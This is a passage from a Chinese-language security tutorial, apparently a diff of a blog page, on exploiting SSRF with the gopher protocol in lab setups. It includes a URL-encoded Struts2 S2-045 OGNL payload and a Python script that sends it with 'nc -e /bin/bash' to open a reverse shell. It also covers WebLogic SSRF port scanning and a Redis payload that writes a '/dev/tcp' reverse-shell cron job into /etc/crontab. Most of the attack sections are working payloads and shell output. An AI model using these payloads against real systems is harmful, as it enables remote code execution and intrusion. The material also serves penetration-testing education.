3%63%6d%64%7d%3a%7b%27%2f%62%69%6e%2f%62%61%73%68%27%2c%27%2d%63%27%2c%23%63%6d%64%7d%29%29%2e%28%23%70%3d%6e%65%77%20%6a%61%76%61%2e%6c%61%6e%67%2e%50%72%6f%63%65%73%73%42%75%69%6c%64%65%72%28%23%63%6d%64%73%29%29%2e%28%23%70%2e%72%65%64%69%72%65%63%74%45%72%72%6f%72%53%74%72%65%61%6d%28%74%72%75%65%29%29%2e%28%23%70%72%6f%63%65%73%73%3d%23%70%2e%73%74%61%72%74%28%29%29%2e%28%23%72%6f%73%3d%28%40%6f%72%67%2e%61%70%61%63%68%65%2e%73%74%72%75%74%73%32%2e%53%65%72%76%6c%65%74%41%63%74%69%6f%6e%43%6f%6e%74%65%78%74%40%67%65%74%52%65%73%70%6f%6e%73%65%28%29%2e%67%65%74%4f%75%74%70%75%74%53%74%72%65%61%6d%28%29%29%29%2e%28%40%6f%72%67%2e%61%70%61%63%68%65%2e%63%6f%6d%6d%6f%6e%73%2e%69%6f%2e%49%4f%55%74%69%6c%73%40%63%6f%70%79%28%23%70%72%6f%63%65%73%73%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%2c%23%72%6f%73%29%29%2e%28%23%72%6f%73%2e%66%6c%75%73%68%28%29%29%7d%0d%0a
+</span></code></pre>
+<p>一定要注意最后加上%0d%0a，以及很多URL编码工具将会回车换行转码为%0a，一定要自己替换为%0a%0d<br />发送请求后可以反弹shell</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">margine:~</span><span> margin$ nc</span><span style="color:#bf616a;"> -l</span><span> 6666
+</span><span style="color:#bf616a;">id
+</span><span style="color:#bf616a;">uid</span><span>=</span><span style="color:#a3be8c;">0</span><span>(</span><span style="color:#bf616a;">root</span><span>) gid=0(root) </span><span style="color:#bf616a;">groups</span><span>=</span><span style="color:#a3be8c;">0</span><span>(</span><span style="color:#bf616a;">root</span><span>)
+</span></code></pre>
+<h3 id="zai-ssrfzhong-ru-he-shi-yong-gopherxie-yi-fan-dan-shell">在SSRF中如何使用gopher协议反弹shell</h3>
+<ol>
+<li>我们先准备了一个带有ssrf漏洞的页面，代码如下：</li>
+</ol>
+<pre data-lang="php" style="background-color:#2b303b;color:#c0c5ce;" class="language-php "><code class="language-php" data-lang="php"><span style="color:#ab7967;">&lt;?php
+</span><span>    $</span><span style="color:#bf616a;">url </span><span>= $</span><span style="color:#bf616a;">_GET</span><span>[&#39;</span><span style="color:#a3be8c;">url</span><span>&#39;];
+</span><span>    $</span><span style="color:#bf616a;">curlobj </span><span>= </span><span style="color:#96b5b4;">curl_init</span><span>($</span><span style="color:#bf616a;">url</span><span>);
+</span><span>    </span><span style="color:#96b5b4;">echo curl_exec</span><span>($</span><span style="color:#bf616a;">curlobj</span><span>);
+</span><span style="color:#ab7967;">?&gt;
+</span></code></pre>
+<p>这里需要注意的是，<strong>你的PHP版本必须大于等于5.3</strong>，并且在PHP.ini文件中开启了extension=php_curl.dll<br />2. 我在机器上开启了一个监听nc -lp 6666<br />   然后在浏览器中访问：</p>
+<pre data-lang="http" style="background-color:#2b303b;color:#c0c5ce;" class="language-http "><code class="language-http" data-lang="http"><span>http://192.168.0.109/ssrf/base/curl_exec.php?url=gopher://192.168.0.119:6666/_abc
+</span></code></pre>
+<p>可以看到nc接收到了消息，没有问题。</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">C:</span><span style="color:#96b5b4;">\D</span><span style="color:#bf616a;">ocuments</span><span> and Settings</span><span style="color:#96b5b4;">\A</span><span>dministrator</span><span style="color:#96b5b4;">\桌</span><span>面&gt;nc</span><span style="color:#bf616a;"> -lp</span><span> 6666
+</span><span style="color:#bf616a;">abc
+</span></code></pre>
+<p>现在我们想，如何使用SSRF漏洞配合gopher协议来获取shell呢？我们的环境如下<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1624628840748-61e0e10e-f214-4fa7-9e0f-a0decad75f91.png#align=left&amp;display=inline&amp;height=1228&amp;id=ue51efcce&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=1228&amp;originWidth=2243&amp;size=1493101&amp;status=done&amp;style=none&amp;width=2243" alt="image.png" /><br />上图就不具体说了，是一个典型的ssrf利用的解释图。<br />在使用ssrf去获取struts2的shell时，遇到了两次困难：</p>
+<ul>
+<li>PHP的curl_exec函数没有发起gopher的请求（这个问题上面已经说过）</li>
+<li>gopher一直请求不到目标页面</li>
+</ul>
+<p>根据我的试错经历，我梳理了下如何一步步的完成gopher请求获取shell。<br />首先我们先做一些简单的事情，顺序如下：</p>
+<ol>
+<li>使用ssrf漏洞发起gopher请求，访问前面用到的get.php</li>
+<li>使用ssrf漏洞发起gopher请求，获取struts2主机的shell</li>
+</ol>
+<p><strong>第一步</strong>：<br />准备好访问get.php的数据包（<strong>照搬的本文开始的包</strong>）</p>
+<pre data-lang="http" style="background-color:#2b303b;color:#c0c5ce;" class="language-http "><code class="language-http" data-lang="http"><span>gopher://192.168.0.109:80/_GET%20/ssrf/base/get.php%3fname=Margin%20HTTP/1.1%0d%0AHost:%20192.168.0.109%0d%0A
+</span></code></pre>
+<p>那我们现在是否可以这样来组成我们的URL？</p>
+<pre data-lang="http" style="background-color:#2b303b;color:#c0c5ce;" class="language-http "><code class="language-http" data-lang="http"><span>http://192.168.0.109/ssrf/base/curl_exec.php?url=gopher://192.168.0.109:80/_GET%20/ssrf/base/get.php%3fname=Margin%20HTTP/1.1%0d%0AHost:%20192.168.0.109%0d%0A
+</span></code></pre>
+<p>我们来测试下，结果如下：<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1624628998687-54fa0449-5416-4048-ad52-696f640d2836.png#align=left&amp;display=inline&amp;height=151&amp;id=ufa816635&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=151&amp;originWidth=2243&amp;size=111812&amp;status=done&amp;style=none&amp;width=2243" alt="image.png" /><br />发现并没有出现get页面的hello Margin，说明请求失败，这个地方卡了一会，发现是因为在PHP在接收到参数后会做一次URL的解码，正如我们上图所看到的，%20等字符已经被转码为空格。所以，curl_exec在发起gopher时用的就是没有进行URL编码的值，就导致了现在的情况，所以我们要进行二次URL编码。编码结果如下：</p>
+<pre data-lang="http" style="background-color:#2b303b;color:#c0c5ce;" class="language-http "><code class="language-http" data-lang="http"><span>http://192.168.0.109/ssrf/base/curl_exec.php?url=gopher%3A%2F%2F192.168.0.109%3A80%2F_GET%2520%2Fssrf%2Fbase%2Fget.php%253fname%3DMargin%2520HTTP%2F1.1%250d%250AHost%3A%2520192.168.0.109%250d%250A
+</span></code></pre>
+<p>此时发起请求，得到如下结果：<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1624629042684-80911512-fba1-4f86-aec4-9ec7195b50fd.png#align=left&amp;display=inline&amp;height=166&amp;id=u7602c9d5&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=166&amp;originWidth=2243&amp;size=189656&amp;status=done&amp;style=none&amp;width=2243" alt="image.png" /><br />发现已经正常，此时便说明我们的环境没有问题，SSRF漏洞利用正常，开始接下来的步骤。<br /><strong>第二步</strong>：<br />准备好struts2-045漏洞的利用代码，并进行二次编码，需要注意的是Content-Type中放了主要的漏洞利用代码，并且特殊字符多，将其单独进行编码，步骤如下：</p>
+<ol>
+<li>将gopher协议一直到Content-Type进行二次编码</li>
+<li>将Content-Type的值所有字符进行URL二次编码<br />最终得到如下结果(太长，不列中间内容，省略部分为Content-type内容)：</li>
+</ol>
+<pre data-lang="http" style="background-color:#2b303b;color:#c0c5ce;" class="language-http "><code class="language-http" data-lang="http"><span>gopher%3A%2F%2F192.168.0.119%3A8080%2F_GET%2520%2FS2-045%2F%2520HTTP%2F1.1%250d%250aHost%3A192.168.0.119%250d%250aContent-Type%3A ......... %0d%0a
+</span></code></pre>
+<p>最终可以获取shell，结果如下：</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">margine:~</span><span> margin$ nc</span><span style="color:#bf616a;"> -l</span><span> 6666
+</span><span style="color:#bf616a;">id
+</span><span style="color:#bf616a;">uid</span><span>=</span><span style="color:#a3be8c;">0</span><span>(</span><span style="color:#bf616a;">root</span><span>) gid=0(root) </span><span style="color:#bf616a;">groups</span><span>=</span><span style="color:#a3be8c;">0</span><span>(</span><span style="color:#bf616a;">root</span><span>)
+</span></code></pre>
+<p><strong>在试错的过程中发现：URL中的／不能进行两次编码，端口号不可以两次编码,协议名称不可两次转码</strong></p>
+<p>最后附上编码脚本（python2.7）：</p>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#65737e;">#!/usr/bin/python
+</span><span style="color:#65737e;"># -*- coding: UTF-8 -*-
+</span><span style="color:#b48ead;">import </span><span>urllib2,urllib
+</span><span>
+</span><span>url = &quot;</span><span style="color:#a3be8c;">http://192.168.0.109/ssrf/base/curl_exec.php?url=</span><span>&quot;
+</span><span>header = &quot;&quot;&quot;</span><span style="color:#a3be8c;">gopher://192.168.0.119:8080/_GET /S2-045/ HTTP/1.1
+</span><span style="color:#a3be8c;">Host:192.168.0.119
+</span><span style="color:#a3be8c;">Content-Type:</span><span>&quot;&quot;&quot;
+</span><span>cmd = &quot;</span><span style="color:#a3be8c;">nc -e /bin/bash 192.168.0.109 6666</span><span>&quot;
+</span><span>content_type = &quot;&quot;&quot;</span><span style="color:#a3be8c;">%{(#_=&#39;multipart/form-data&#39;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#39;</span><span>&quot;&quot;&quot;+cmd+&quot;&quot;&quot;</span><span style="color:#a3be8c;">&#39;).(#iswin=(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).(#cmds=(#iswin?{&#39;cmd.exe&#39;,&#39;/c&#39;,#cmd}:{&#39;/bin/bash&#39;,&#39;-c&#39;,#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}</span><span>&quot;&quot;&quot;
+</span><span>header_encoder = &quot;&quot;
+</span><span>content_type_encoder = &quot;&quot;
+</span><span>content_type_encoder_2 = &quot;&quot;
+</span><span>url_char = [&quot; &quot;]
+</span><span>nr = &quot;</span><span style="color:#96b5b4;">\r\n</span><span>&quot;
+</span><span>
+</span><span style="color:#65737e;"># 编码请求头
+</span><span style="color:#b48ead;">for </span><span>single_char </span><span style="color:#b48ead;">in </span><span>header:
+</span><span>    </span><span style="color:#b48ead;">if </span><span>single_char in url_char:
+</span><span>        header_encoder += urllib.</span><span style="color:#bf616a;">quote</span><span>(urllib.</span><span style="color:#bf616a;">quote</span><span>(single_char,&#39;</span><span style="color:#a3be8c;">utf-8</span><span>&#39;),&#39;</span><span style="color:#a3be8c;">utf-8</span><span>&#39;)
+</span><span>    </span><span style="color:#b48ead;">else</span><span>:
+</span><span>        header_encoder += single_char
+</span><span>
+</span><span>header_encoder = header_encoder.</span><span style="color:#bf616a;">replace</span><span>(&quot;</span><span style="color:#96b5b4;">\n</span><span>&quot;,urllib.</span><span style="color:#bf616a;">quote</span><span>(urllib.</span><span style="color:#bf616a;">quote</span><span>(nr,&#39;</span><span style="color:#a3be8c;">utf-8</span><span>&#39;),&#39;</span><span style="color:#a3be8c;">utf-8</span><span>&#39;))
+</span><span>
+</span><span style="color:#65737e;"># 编码content-type，第一次编码
+</span><span style="color:#b48ead;">for </span><span>single_char </span><span style="color:#b48ead;">in </span><span>content_type:
+</span><span>    </span><span style="color:#65737e;"># 先转为ASCII,在转十六进制即可变为URL编码
+</span><span>    content_type_encoder += </span><span style="color:#bf616a;">str</span><span>(</span><span style="color:#96b5b4;">hex</span><span>(</span><span style="color:#96b5b4;">ord</span><span>(single_char)))
+</span><span>content_type_encoder = content_type_encoder.</span><span style="color:#bf616a;">replace</span><span>(&quot;</span><span style="color:#a3be8c;">0x</span><span>&quot;,&quot;</span><span style="color:#a3be8c;">%</span><span>&quot;) + urllib.</span><span style="color:#bf616a;">quote</span><span>(nr,&#39;</span><span style="color:#a3be8c;">utf-8</span><span>&#39;)
+</span><span style="color:#65737e;"># 编码content-type，第二次编码
+</span><span style="color:#b48ead;">for </span><span>single_char </span><span style="color:#b48ead;">in </span><span>content_type_encoder:
+</span><span>    </span><span style="color:#65737e;"># 先转为ASCII,在转十六进制即可变为URL编码
+</span><span>    content_type_encoder_2 += </span><span style="color:#bf616a;">str</span><span>(</span><span style="color:#96b5b4;">hex</span><span>(</span><span style="color:#96b5b4;">ord</span><span>(single_char)))
+</span><span>content_type_encoder_2 = content_type_encoder_2.</span><span style="color:#bf616a;">replace</span><span>(&quot;</span><span style="color:#a3be8c;">0x</span><span>&quot;,&quot;</span><span style="color:#a3be8c;">%</span><span>&quot;)
+</span><span>exp = url + header_encoder + content_type_encoder_2
+</span><span style="color:#b48ead;">print </span><span>exp
+</span><span>request = urllib2.</span><span style="color:#bf616a;">Request</span><span>(exp)
+</span><span>response = urllib2.</span><span style="color:#bf616a;">urlopen</span><span>(request).</span><span style="color:#bf616a;">read</span><span>()
+</span><span style="color:#b48ead;">print </span><span>response
+</span></code></pre>
+<h2 id="li-yong-weblogicde-ssrflou-dong-tan-ce-nei-wang-bing-fan-hui-shell">利用weblogic的SSRF漏洞探测内网并返回shell</h2>
+<p>这里环境采用vulhub的docker环境，在centos虚拟机中启动docker-compose，centOS的IP地址为192.168.31.185</p>
+<ol>
+<li>利用ssrf探测内网</li>
+</ol>
+<p>打开环境<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1624738117514-8b415229-4596-459b-b830-ec145a5bae1c.png#align=left&amp;display=inline&amp;height=912&amp;id=u55b146ff&amp;margin=%5Bobject%20Object%5D&amp;name=Snipaste_2021-06-27_04-08-06.png&amp;originHeight=912&amp;originWidth=1920&amp;size=77843&amp;status=done&amp;style=none&amp;width=1920" alt="Snipaste_2021-06-27_04-08-06.png" /><br />在三个输入框中随便填入几个数字，点击search，页面回显如上图所示，此ssrf注入点就在这里<br />抓包<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1624738213522-153972bf-070f-4aa5-aa6a-8535e3066719.png#align=left&amp;display=inline&amp;height=983&amp;id=u0b4d8a25&amp;margin=%5Bobject%20Object%5D&amp;name=Snipaste_2021-06-27_04-07-11.png&amp;originHeight=983&amp;originWidth=1694&amp;size=149407&amp;status=done&amp;style=none&amp;width=1694" alt="Snipaste_2021-06-27_04-07-11.png" /><br />在包中发现 operator 字样，其中的URL地址 www-3.ibm.com 同刚才页面回显中的一致，将 operator 的值修改为 172.18.0.2:80 ，发包<br />结果如下图右侧所示<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1624738435051-b1e061f1-9c67-4c07-ad5b-1c179d4c2f13.png#align=left&amp;display=inline&amp;height=983&amp;id=u37d95ad4&amp;margin=%5Bobject%20Object%5D&amp;name=Snipaste_2021-06-27_04-13-32.png&amp;originHeight=983&amp;originWidth=1694&amp;size=164786&amp;status=done&amp;style=none&amp;width=1694" alt="Snipaste_2021-06-27_04-13-32.png" /><br />“cannot connect”，所以172.18.0.2的80端口并没有开放<br />我们把80改为6379，结果如下<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1624738533076-d54ad861-f705-4311-a1c5-fe8d2223db71.png#align=left&amp;display=inline&amp;height=983&amp;id=ucee94c98&amp;margin=%5Bobject%20Object%5D&amp;name=Snipaste_2021-06-27_04-06-26.png&amp;originHeight=983&amp;originWidth=1694&amp;size=166813&amp;status=done&amp;style=none&amp;width=1694" alt="Snipaste_2021-06-27_04-06-26.png" /><br />此结果证明172.18.0.2的6379端口是开放的</p>
+<p>这里可以使用burp来爆破端口<br />设置好变量<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1624738776904-dbc217c7-4bd7-44ed-be5a-c26c54c5b8ae.png#align=left&amp;display=inline&amp;height=983&amp;id=ued6e0916&amp;margin=%5Bobject%20Object%5D&amp;name=Snipaste_2021-06-27_04-19-00.png&amp;originHeight=983&amp;originWidth=1694&amp;size=115734&amp;status=done&amp;style=none&amp;width=1694" alt="Snipaste_2021-06-27_04-19-00.png" /><br />设置爆破1-10000端口<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1624738803443-d30bcf91-4005-46c0-a59e-6c7e4992222d.png#align=left&amp;display=inline&amp;height=983&amp;id=u988823ae&amp;margin=%5Bobject%20Object%5D&amp;name=Snipaste_2021-06-27_04-19-14.png&amp;originHeight=983&amp;originWidth=1694&amp;size=63569&amp;status=done&amp;style=none&amp;width=1694" alt="Snipaste_2021-06-27_04-19-14.png" /><br />以length排序后，可以立马发现6379端口<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1624738999467-146d6913-6620-4a05-8f92-bae26ab2feb4.png#align=left&amp;display=inline&amp;height=778&amp;id=u106c439c&amp;margin=%5Bobject%20Object%5D&amp;name=Snipaste_2021-06-27_04-22-00.png&amp;originHeight=778&amp;originWidth=1049&amp;size=35121&amp;status=done&amp;style=none&amp;width=1049" alt="Snipaste_2021-06-27_04-22-00.png" /><br />也可以通过python脚本实现……</p>
+<ol start="2">
+<li>反弹shell</li>
+</ol>
+<p>首先在主机192.168.31.73（kali）启动nc监听</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">nc -lvnp</span><span> 10000
+</span></code></pre>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1624741363484-ef01dc2f-82f4-48d2-bd44-53e320f4b920.png#align=left&amp;display=inline&amp;height=61&amp;id=vYTVZ&amp;margin=%5Bobject%20Object%5D&amp;name=Snipaste_2021-06-27_05-02-32.png&amp;originHeight=61&amp;originWidth=389&amp;size=3231&amp;status=done&amp;style=none&amp;width=389" alt="Snipaste_2021-06-27_05-02-32.png" /><br />然后这里我们使用如下反弹shell的脚本</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">test</span><span>%</span><span style="color:#d08770;">0</span><span style="color:#bf616a;">D</span><span>%</span><span style="color:#d08770;">0</span><span style="color:#bf616a;">A</span><span>%</span><span style="color:#d08770;">0</span><span style="color:#bf616a;">D</span><span>%</span><span style="color:#d08770;">0</span><span style="color:#bf616a;">A
+</span><span>
+</span><span style="color:#96b5b4;">set</span><span> 1 &quot;</span><span style="color:#a3be8c;">\n\n\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.31.73/10000 0&gt;&amp;1\n\n\n\n</span><span>&quot;
+</span><span style="color:#bf616a;">config</span><span> set dir /etc/
+</span><span style="color:#bf616a;">config</span><span> set dbfilename crontab
+</span><span style="color:#bf616a;">save
+</span></code></pre>
+<p>我们将其进行URL编码</p>
+<pre data-lang="http" style="background-color:#2b303b;color:#c0c5ce;" class="language-http "><code class="language-http" data-lang="http"><span>http://172.18.0.2:6379/
+</span><span>test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.31.73%2F10000%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa
+</span></code></pre>
+<p>其中172.18.0.2:6379是目标主机<br />通过burp构造发送包，点击send<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1624741724489-e62348de-f886-4599-98b2-22b4a68dc15f.png#align=left&amp;display=inline&amp;height=983&amp;id=u29f9a91d&amp;margin=%5Bobject%20Object%5D&amp;name=Snipaste_2021-06-27_05-08-28.png&amp;originHeight=983&amp;originWidth=1694&amp;size=186418&amp;status=done&amp;style=none&amp;width=1694" alt="Snipaste_2021-06-27_05-08-28.png" /><br />回复包说明服务器已经收到了我们的请求<br />这时候我们再回到kali主机，发现已经得到了shell<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1624741843784-99ed8c1d-5005-46d8-945e-b3933bcc6ed7.png#align=left&amp;display=inline&amp;height=241&amp;id=u2af3d5c0&amp;margin=%5Bobject%20Object%5D&amp;name=Snipaste_2021-06-27_05-10-08.png&amp;originHeight=241&amp;originWidth=597&amp;size=13175&amp;status=done&amp;style=none&amp;width=597" alt="Snipaste_2021-06-27_05-10-08.png" /></p>
+<h2 id="ssrflou-dong-shen-tou-redis">SSRF漏洞渗透Redis</h2>
+<h3 id="redisding-yi">Redis定义</h3>
+<p>REmote DIctionary Server(Redis) 是一个由Salvatore Sanfilippo写的key-value存储系统。<br />Redis是一个开源的使用ANSI C语言编写、遵守BSD协议、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。<br />它通常被称为数据结构服务器，因为值（value）可以是 字符串(String), 哈希(Hash), 列表(list), 集合(sets) 和 有序集合(sorted sets)等类型。 ----摘自<a href="https://link.zhihu.com/?target=https%3A//www.runoob.com/redis/redis-tutorial.html">runoob</a><br />redis是一种非关系型数据库，nosql</p>
+<h3 id="redisan-zhuang">Redis安装</h3>
+<ol>
+<li>安装redis</li>
+</ol>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">apt-get</span><span> install redis-server
+</span></code></pre>
+<ol start="2">
+<li>修改redis监听IP(如果不修改，不可远程登录)，IP需要替换为自己的IP</li>
+</ol>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">vim</span><span> /etc/redis/redis.conf
+</span><span style="color:#65737e;"># 修改为以下内容
+</span><span style="color:#96b5b4;">bind</span><span> 127.0.0.1 192.168.0.67
+</span></code></pre>
+<ol start="3">
+<li>启动redis服务</li>
+</ol>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">service</span><span> redis-server start
+</span></code></pre>
+<h3 id="0x01-redisru-qin-fan-dan-shell">0x01 Redis入侵，反弹shell</h3>
+<p>在开始讲攻击Redis之前，必须要理解Redis的客户端和服务端的通信方式，以及数据发送的格式，该目的的实现需要tcpdump的抓包功能。使用抓包软件来查看Redis客户端和Redis服务端的通信数据，找到语法结构后开始模拟客户端发送数据。<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1624805501488-ee361262-e46a-4c8d-9ced-1d417cc73770.png#align=left&amp;display=inline&amp;height=982&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=982&amp;originWidth=2446&amp;size=598905&amp;status=done&amp;style=none&amp;width=2446" alt="image.png" /></p>
+<ol>
+<li>使用tcpdump来完成抓包，命令如下：</li>
+</ol>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">tcpdump -i</span><span> eth0 port 6379</span><span style="color:#bf616a;"> -w</span><span> redis.pcap
+</span><span style="color:#bf616a;">参数说明如下：（更多tcpdump的教程，参考[Tcpdump教程]</span><span>(https://www.runoob.com/linux/linux-comm-tcpdump.html)</span><span style="color:#bf616a;">）
+</span><span style="color:#bf616a;">-i：指定网卡为eth0
+</span><span style="color:#bf616a;">port：指定抓哪个端口的数据
+</span><span style="color:#bf616a;">-w：将流量包保存为文件
+</span></code></pre>
+<ol start="2">
+<li>使用Redis客户端登录Redis服务端，命令如下(默认无密码)：</li>
+</ol>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">root@Kali-2018:~/tmp#</span><span> redis-cli</span><span style="color:#bf616a;"> -h</span><span> 192.168.0.119</span><span style="color:#bf616a;"> -p</span><span> 6379
+</span><span style="color:#bf616a;">192.168.0.119:6379</span><span>&gt; get a
+</span><span>(</span><span style="color:#bf616a;">nil</span><span>)
+</span><span style="color:#bf616a;">192.168.0.119:6379</span><span>&gt;
+</span></code></pre>
+<p>以上命令做了一个获取a对应的值是多少的操作，现在我们使用wireshark看一下抓到的包(使用追踪流-TCP流)：</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>上面非常多的内容就不放了
+</span><span>*2
+</span><span>$3
+</span><span>get
+</span><span>$1
+</span><span>a
+</span><span>-1
+</span></code></pre>
+<p>如果不理解Redis的数据发送的数据包格式，是看不懂上面内容的，这里必须要讲这么几个内容：<br /><strong>2.1、序列化协议</strong>：客户端-服务端之间交互的是序列化后的协议数据。在Redis中，协议数据分为不同的类型，每种类型的数据均以CRLF（\r\n）结束，通过数据的首字符区分类型。<br /><strong>2.2、inline command</strong>：这类数据表示Redis命令，首字符为Redis命令的字符，格式为 str1 str2 str3 …。如：exists key1，命令和参数以空格分隔。<br /><strong>2.3、simple string</strong>：首字符为'+'，后续字符为string的内容，且该string 不能包含'\r'或者'\n'两个字符，最后以'\r\n'结束。如：'+OK\r\n'，表示”OK”，这个string数据。<br /><strong>2.4、bulk string</strong>：bulk string 首字符为'$'，紧跟着的是string数据的长度，'\r\n'后面是内容本身（包含’\r’、’\n’等特殊字符），最后以'\r\n'结束。如：</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>&quot;$12\r\nhello\r\nworld\r\n&quot;
+</span></code></pre>
+<p>上面字节串描述了 “hello\r\nworld” 的内容（中间有个换行）。对于&quot; &quot;空串和null，通过'$' 之后的数字进行区分：</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>&quot;$0\r\n\r\n&quot; 表示空串；
+</span><span>&quot;$-1\r\n&quot; 表示null。
+</span></code></pre>
+<p><strong>2.5、integer</strong>：以 ':' 开头，后面跟着整型内容，最后以'\r\n'结尾。如：&quot;:13\r\n&quot;，表示13的整数。<br /><strong>2.6、array</strong>：以'*'开头，紧跟着数组的长度，&quot;\r\n&quot; 之后是每个元素的序列化数据。如：&quot;<em>2\r\n+abc\r\n:9\r\n&quot; 表示一个长度为2的数组：[&quot;abc&quot;, 9]。数组长度为0或 -1分别表示空数组或 null。<br />数组的元素本身也可以是数组，多级数组是树状结构，采用先序遍历的方式序列化。如：[[1, 2], [&quot;abc&quot;]]，序列化为：&quot;<em>2\r\n</em>2\r\n:1\r\n:2\r\n</em>1\r\n+abc\r\n&quot;。</p>
+<ol start="3">
+<li>经过上面内容的讲解，在回过头理解抓到的redis的包就很容易明白了。</li>
+</ol>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>上面非常多的内容就不放了
+</span><span>*2 数组长度为2
+</span><span>$3 bulk string，代表字符串长度为3，就是get
+</span><span>get 普通字符
+</span><span>$1 bulk string，代表字符串长度为1，就是a
+</span><span>a 普通字符
+</span><span>-1 返回内容，-1代表null
+</span></code></pre>
+<p>明白以上内容后基本就理清了思路，如果要给redis发命令，按照他的序列化规则即可。现在有一个大胆的想法，如果我用gopher去执行redis的命令呢？为了实现我们的想法，我们在Redis中加一个key，名字为name，值为Margin。命令如下：</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>set name Margin
+</span></code></pre>
+<p>此时，我们使用curl来发起gopher的请求，如下：</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">curl</span><span> gopher://192.168.0.119:6379/_*2
+</span><span>$</span><span style="color:#bf616a;">3
+</span><span style="color:#bf616a;">get
+</span><span>$</span><span style="color:#bf616a;">4
+</span><span style="color:#bf616a;">name
+</span></code></pre>
+<p>将其转化为url编码</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">curl</span><span> gopher://192.168.0.119:6379/_%</span><span style="color:#d08770;">2</span><span>a%</span><span style="color:#d08770;">32</span><span>%</span><span style="color:#d08770;">0</span><span>d%</span><span style="color:#d08770;">0</span><span>a%</span><span style="color:#d08770;">24</span><span>%</span><span style="color:#d08770;">33</span><span>%</span><span style="color:#d08770;">0</span><span>d%</span><span style="color:#d08770;">0</span><span>a%</span><span style="color:#d08770;">67</span><span>%</span><span style="color:#d08770;">65</span><span>%</span><span style="color:#d08770;">74</span><span>%</span><span style="color:#d08770;">0</span><span>d%</span><span style="color:#d08770;">0</span><span>a%</span><span style="color:#d08770;">24</span><span>%</span><span style="color:#d08770;">34</span><span>%</span><span style="color:#d08770;">0</span><span>d%</span><span style="color:#d08770;">0</span><span>a%</span><span style="color:#d08770;">6</span><span>e%</span><span style="color:#d08770;">61</span><span>%</span><span style="color:#d08770;">6</span><span>d%</span><span style="color:#d08770;">65</span><span>%</span><span style="color:#d08770;">0</span><span>d%</span><span style="color:#d08770;">0</span><span>a
